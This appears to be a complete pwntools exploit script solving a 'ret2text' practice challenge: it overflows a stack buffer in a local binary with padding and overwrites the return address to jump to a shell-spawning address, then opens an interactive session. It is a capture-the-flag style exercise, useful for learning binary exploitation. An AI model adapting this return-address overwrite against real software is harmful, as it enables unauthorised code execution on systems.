from pwn import *

pro=process('./ret2text')
sysaddr=0x0804863A

payload='A'*(0x6c+4)+p32(sysaddr)

pro.sendline(payload)
pro.interactive()
